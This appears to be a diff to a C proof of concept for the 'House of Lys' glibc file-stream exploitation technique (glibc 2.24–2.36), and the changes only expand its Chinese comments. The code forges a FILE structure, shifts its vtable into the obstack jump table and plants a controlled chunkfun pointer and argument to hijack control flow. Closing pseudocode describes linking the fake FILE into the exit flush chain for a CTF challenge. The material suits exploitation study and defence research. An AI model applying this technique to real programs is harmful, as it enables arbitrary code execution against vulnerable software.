@@ -1,10 +1,10 @@
 #define _GNU_SOURCE
 
 /*
- * House of Lys 的 shifted obstack vtable，适用于 glibc 2.24～2.36。
+ * House of Lys 手法，把 obstack vtable 错位使用，适用于 glibc 2.24～2.36。
  *
  * 本项目对应构建中：_IO_obstack_jumps = _IO_wfile_jumps + 0x300。
- * 成功效果：错位后的 overflow 槽进入 obstack xsputn，最终调用 chunkfun。
+ * 成功效果：错位后的 overflow 槽会走进 obstack 的 xsputn，最终调用到 chunkfun。
  */
 
 #include <assert.h>
@@ -32,12 +32,12 @@ int main(void)
 {
     setbuf(stdout, NULL);
 
-    /* dlsym 只代替题目中的 libc 泄漏。 */
+    /* 这里用 dlsym 代替题目里通常要做的一次 libc 地址泄漏。 */
     overflow_fn call_overflow = dlsym(RTLD_DEFAULT, "__overflow");
     void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
     assert(call_overflow != NULL && wfile_jumps != NULL);
 
-    /* glibc 2.24～2.36 目标构建中的固定相对偏移。 */
+    /* 这是 glibc 2.24～2.36 目标构建里固定的相对偏移。 */
     uintptr_t obstack_jumps = (uintptr_t)wfile_jumps + 0x300;
 
     unsigned char fake_file[0x100] __attribute__((aligned(0x10)));
@@ -47,28 +47,28 @@ int main(void)
 
     FILE *fp = (FILE *)fake_file;
 
-    /* 保持窄字符路径，并让 overflow 条件成立。 */
+    /* 保持窄字符路径，并让 overflow 的触发条件成立。 */
     fp->_mode = -1;
     fp->_IO_write_ptr = (char *)1;
     fp->_IO_write_end = (char *)0;
 
-    /* primary vtable 错位 +0x20，使 overflow 槽落到 obstack xsputn。 */
+    /* primary vtable 整体错位 +0x20，让 overflow 槽落到 obstack 的 xsputn 上。 */
     *(void **)(fake_file + 0xd8) = (void *)(obstack_jumps + 0x20);
 
-    /* FILE+0xe0 保存 fake obstack 的指针。 */
+    /* FILE+0xe0 处存的是 fake obstack 的指针。 */
     *(void **)(fake_file + 0xe0) = fake_obstack;
 
-    /* 设置 object_base、next_free 和 chunk_limit，强制进入 _obstack_newchunk。 */
+    /* 设置 object_base、next_free 和 chunk_limit，强制让流程走进 _obstack_newchunk。 */
     fake_obstack[0x10 / 8] = 0;
     fake_obstack[0x18 / 8] = 1;
     fake_obstack[0x20 / 8] = 0;
 
-    /* 把 chunkfun 与 extra_arg 都改成受控值。 */
+    /* 把 chunkfun 和 extra_arg 都改成我们控制的值。 */
     fake_obstack[0x38 / 8] = (uintptr_t)lys_chunkfun;
     fake_obstack[0x48 / 8] = (uintptr_t)&controlled_argument;
     fake_obstack[0x50 / 8] = 1;
 
-    /* 错位后的 xsputn 会把第三参数 rdx 当作长度，因此显式令 rdx=1。 */
+    /* 错位后的 xsputn 会把第三个参数 rdx 当作长度，所以这里显式令 rdx=1。 */
     __asm__ volatile(
         "call *%[target]"
         :
@@ -82,8 +82,9 @@ int main(void)
 /*
  * ======================== exit/flush 布局伪代码 ========================
  *
- * 本文件已经实际验证“合法 obstack 表 +0x20 错位”会把 overflow 调用送进
- * xsputn，再进入 chunkfun。题目中还要完成 FILE 链投递：
+ * 本文件已经实际验证过：把合法的 obstack 表错位 +0x20，能让 overflow
+ * 调用最终走进 xsputn，再进入 chunkfun。但在真实题目里，还需要把这个
+ * fake FILE 挂到 IO 链上，让 exit 时的自动 flush 能找到它，具体要做的是：
  *
  *     fake_file._IO_write_base = 0；
  *     fake_file._IO_write_ptr = 1；
@@ -100,9 +101,10 @@ int main(void)
  *     fake_obstack.extra_arg = 第一个参数；
  *     fake_obstack.use_extra_arg = 1；
  *
- *     把 fake_file 挂入退出清理链；
- *     确认调用点残留的 rdx 可作为 xsputn 长度；
- *     调用 exit 或其他真实 flush 触发器；
+ *     把 fake_file 挂到退出时的清理链上；
+ *     确认调用点当时残留在寄存器里的 rdx 可以当作 xsputn 的长度用；
+ *     再调用 exit，或者找到题目里其他真实的 flush 触发点；
  *
- * 2.37 删除旧 `_IO_obstack_xsputn` 消费路径，不能只改一个 vtable 偏移。
+ * 2.37 把旧的 `_IO_obstack_xsputn` 消费路径整体删掉了，光改一个 vtable
+ * 偏移已经不够，需要换一条新链路。
  */
